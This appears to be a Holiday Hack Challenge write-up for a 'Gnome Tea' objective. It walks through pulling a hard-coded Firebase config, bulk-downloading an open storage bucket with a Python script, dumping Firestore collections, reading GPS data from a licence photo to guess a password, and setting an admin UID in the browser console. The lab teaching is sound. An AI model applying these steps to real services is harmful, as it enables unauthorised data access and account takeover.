---
icon: material/text-box-outline
---

# Gnome Tea

![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_0.png)<br/>

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
**Direct link**: [Going_in_reverse](https://dosis-network-down.holidayhackchallenge.com/)


## Hints
??? tip "Statically Coded"
    Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.
??? tip "Gnome Tea"
    I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services
??? tip "Rules"
    Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages.
??? tip "License"
    Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.

## Objective

!!! question "Request"
   Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.

??? quote "Kevin McFarland"
    Hi again. Say, you wouldn't happen to have time to help me out with something?<br/>

    The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.<br/>

    I know they've been using [GnomeTea]("https://gnometea.web.app/login") to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.

    I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.

## Solution

https://gnometea.web.app/login references below js file
https://gnometea.web.app/assets/index-BVLyJWJ_.js
Which has the the hard coded details
```
    apiKey: "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain: "holidayhack2025.firebaseapp.com",
    projectId: "holidayhack2025",
    storageBucket: "holidayhack2025.firebasestorage.app",
    messagingSenderId: "341227752777",
    appId: "1:341227752777:web:7b9017d3d2d83ccf481e98"
```
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_1.png)<br/>

Wrote the download_files.py to download all teh files in teh stogareBucket
Its all jpeg(driver licence) and png files(photos) of the gnomes.

```py title="download_files.py"
    import requests
    import os

    bucket = 'holidayhack2025.firebasestorage.app'
    file_path = 'tea'  # Firebase path to file
    file_path_encoded = file_path.replace('/', '%2F')

    url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o'

    # Create folder to save downloads
    os.makedirs('downloads', exist_ok=True)

    # List all files
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        items = data.get('items', [])

        for item in items:
            name = item['name']
            name_encoded = name.replace('/', '%2F')  # URL encode
            download_url = f'https://firebasestorage.googleapis.com/v0/b/{bucket}/o/{name_encoded}?alt=media'

            print(f'Downloading: {name}')
            file_response = requests.get(download_url)

            if file_response.status_code == 200:
                with open(os.path.join('downloads', os.path.basename(name)), 'wb') as f:
                    f.write(file_response.content)
            else:
                print(f"Failed to download {name}: {file_response.status_code}")
    else:
        print("Bucket is not public or listing not allowed:", response.status_code)

```

![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_2.png)<br/>
from the hint 
??? quote "hint about exif" 
    Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.
Looking for latitude and longitude in teh jpeg files.
l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg has the location data
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_3.png)<br/>

This belongs to Barnanby Briefcase. <br/>

![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_4.png)<br/>

Per the hint the jpeg file might contain the location data. Using exiftool and we get the location data.<br>
```
exiftool *.jpeg | grep GPS
```
We use a GPS website to get location with latitude and longitude.<br/>
[https://www.gps-coordinates.net/] ("https://www.gps-coordinates.net/")<br/>
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_5.png)<br/>


A location in Australia named Gnomesville. [Google Maps link]("https://www.google.com/maps/place/Gnomesville+Car+Park/@-33.4657638,115.9123758,18z/data=!4m12!1m5!3m4!2zMzPCsDI3JzUzLjkiUyAxMTXCsDU0JzM3LjYiRQ!8m2!3d-33.4649722!4d115.9104444!3m5!1s0x2a31c3adfd91113f:0x4bb9386a1be096f!8m2!3d-33.4655219!4d115.9115959!16s%2Fg%2F11g6yqsdd9?entry=ttu&g_ep=EgoyMDI1MTEwNC4xIKXMDSoASAFQAw%3D%3D") <br/>

### Get the data
dms<br/>
```
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk > dms.json
```

tea<br/>
```
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk > tea.json
```

gnomes<br/>
```
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk > gnomes.json
```

Looking at the dms.json looking for "pass"<br/>
??? quote "Hint about the password"
    My password is actually the name of my hometown that I grew up in.<br/>
    I took my picture of my id there

![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_6.png)<br/>

Since the location data was found in the Barnanby Briefcase’s id, It has to be his password based on the above. Now we need to look for his email address.<br/>
```
cat gnomes.json | grep email
```
The email of Barnanby is : <br/>
```
barnabybriefcase@gnomemail.dosis
```
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_7.png)<br/>

Website  : https://gnometea.web.app/ <br/>
UserName : barnabybriefcase@gnomemail.dosis <br/>
Password : gnomesville <br/>

and we are in.<br/>
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_8.png)<br/>

Now looking for the secret passphrase which gnomes use to communicate with each other. It can not be user specific. <br/>

There is a reference of /admin in the : <br/>
[https://gnometea.web.app/assets/index-BVLyJWJ_.js]("https://gnometea.web.app/assets/index-BVLyJWJ_.js")

When we try to go there :<br/>
[https://gnometea.web.app/admin]("https://gnometea.web.app/admin")
We get the below with a label <br/>

window.ADMIN_UID: not set <br/>

![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_9.png)<br/>

When we inspect the below file<br/>
[https://gnometea.web.app/assets/index-BVLyJWJ_.js]("https://gnometea.web.app/assets/index-BVLyJWJ_.js")<br/>

We notice ADMIN_UID is expected to have a value:<br/>
```
3loaihgxP0VwCTKmkHHFLe6FZ4m2
```
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_10.png)<br/>

We set that in the browser console.<br/>
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_11.png)<br/>

```
window_ADMIN_UID="3loaihgxP0VwCTKmkHHFLe6FZ4m2"
```

Admin page loads showing the secret passphrase:
```
GigGigglesGiggler
```
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_11.png)<br/>

We submit that as the answer and that is accepted.<br/>
![Gnome_Tea](../img/objectives/Gnome_Tea/Gnome_Tea_13.png)<br/>


!!! success "Answer"
   GigGigglesGiggler

## Response
!!! quote "Thomas Bouve"
    Excellent! Now we can communicate with the gnomes. When I tried to talk to one just now it said "passphrase accepted".<br/>

    I asked what they were up to and it said something about going to the old warehouse/data center at the appointed time for the next meeting. No clue what that means though.<br/>

    Anyhoo, that's a pretty big item you helped remove from my pile of unfinished hacking projects. I really appreciate the assist!<br/>